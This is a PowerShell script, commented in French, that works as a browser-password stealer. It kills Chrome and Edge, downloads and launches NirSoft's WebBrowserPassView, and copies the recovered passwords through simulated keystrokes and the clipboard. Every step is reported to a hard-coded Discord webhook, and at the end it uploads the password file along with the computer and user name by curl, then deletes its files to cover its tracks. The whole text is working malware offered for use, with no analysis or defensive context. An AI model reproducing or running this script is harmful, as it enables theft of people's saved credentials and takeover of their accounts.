$wh="https://discord.com/api/webhooks/1467465390576766998/4_TcKXgnZalThMN2QWyUY3q-H_IPWFR_Y1C2YqXnVcM-G_cxPZeTatGBSkTtCIRr_yGX"

function Send-Discord { 
    param([string]$m) 
    try { 
        irm $wh -Method Post -Body (@{content=$m}|ConvertTo-Json) -ContentType 'application/json' | Out-Null 
    } catch {} 
}

Send-Discord "🟢 START - $env:COMPUTERNAME | $env:USERNAME"

# NE PAS FERMER BRAVE - seulement Chrome et Edge
Get-Process chrome,msedge -EA 0 | Stop-Process -Force -EA 0
Start-Sleep 3

Set-Location $env:TEMP
Remove-Item WebBrowserPassView*,wbpv*,passwords.txt -Recurse -Force -EA 0

Send-Discord "📥 Step 1: Downloading WebBrowserPassView..."

try {
    [Net.ServicePointManager]::SecurityProtocol = 'Tls12'
    
    # Télécharger le ZIP
    Invoke-WebRequest "https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip" -OutFile "wbpv.zip" -UseBasicParsing
    
    if (!(Test-Path "wbpv.zip")) {
        Send-Discord "❌ Download failed - file not created"
        exit
    }
    
    $zipSize = [math]::Round((Get-Item "wbpv.zip").Length / 1KB, 2)
    Send-Discord "✅ Downloaded $zipSize KB"
    
    Send-Discord "📦 Step 2: Extracting..."
    
    # Extraire
    Expand-Archive "wbpv.zip" -DestinationPath "." -Force
    
    # Trouver l'exe
    $exe = Get-ChildItem -Filter "WebBrowserPassView.exe" -Recurse -EA 0 | Select -First 1
    
    if (!$exe) {
        Send-Discord "❌ EXE not found after extraction"
        $files = (Get-ChildItem | Select -First 10 -ExpandProperty Name) -join ", "
        Send-Discord "📁 Files present: $files"
        exit
    }
    
    Send-Discord "✅ Found: $($exe.Name) at $($exe.DirectoryName)"
    Send-Discord "🚀 Step 3: Launching WebBrowserPassView..."
    
    # Lancer le programme (comme le VBScript fait avec s.Run)
    $process = Start-Process $exe.FullName -PassThru
    
    # Attendre que le programme charge (comme WScript.Sleep 3000)
    Start-Sleep 4
    
    Send-Discord "⌨️ Step 4: Simulating Ctrl+A and Ctrl+C..."
    
    # Charger l'assembly pour SendKeys
    Add-Type -AssemblyName System.Windows.Forms
    
    # Mettre le focus sur la fenêtre
    $wshell = New-Object -ComObject WScript.Shell
    $wshell.AppActivate($process.Id) | Out-Null
    Start-Sleep 500
    
    # Ctrl+A (sélectionner tout) - comme s.SendKeys "^a"
    [System.Windows.Forms.SendKeys]::SendWait("^a")
    Start-Sleep 300
    
    # Ctrl+C (copier) - comme s.SendKeys "^c"
    [System.Windows.Forms.SendKeys]::SendWait("^c")
    Start-Sleep 700
    
    Send-Discord "📋 Step 5: Reading clipboard..."
    
    # Récupérer le clipboard (comme clipboardData = s.Exec("powershell -command Get-Clipboard"))
    $clipboardContent = Get-Clipboard -Raw -EA 0
    
    # Fermer le programme (comme s.SendKeys "%{F4}")
    $process | Stop-Process -Force -EA 0
    
    if ($clipboardContent -and $clipboardContent.Length -gt 50) {
        Send-Discord "✅ Clipboard captured - $($clipboardContent.Length) chars"
        
        # Sauvegarder dans un fichier (comme ts.Write clipboardData)
        $outputFile = "$env:TEMP\passwords.txt"
        $clipboardContent | Out-File $outputFile -Encoding UTF8
        
        # Compter les mots de passe
        $count = ([regex]::Matches($clipboardContent, "Password")).Count
        $size = [math]::Round((Get-Item $outputFile).Length / 1KB, 2)
        
        Send-Discord "📤 Step 6: Uploading - $count passwords found ($size KB)"
        
        # Upload vers Discord
        curl.exe -F "file=@$outputFile" -F "content=🔑 **$count PASSWORDS EXTRACTED**`n**PC:** $env:COMPUTERNAME`n**User:** $env:USERNAME`n**Date:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" $wh
        
        Send-Discord "✅ UPLOAD SUCCESS"
        
        Remove-Item $outputFile -Force
    } else {
        Send-Discord "❌ Clipboard empty or too small"
        Send-Discord "⚠️ Clipboard length: $($clipboardContent.Length) chars"
    }
    
} catch {
    Send-Discord "❌ ERROR: $($_.Exception.Message)"
}

# Nettoyage
Remove-Item WebBrowserPassView*,wbpv* -Recurse -Force -EA 0

Send-Discord "🧹 FINISHED"
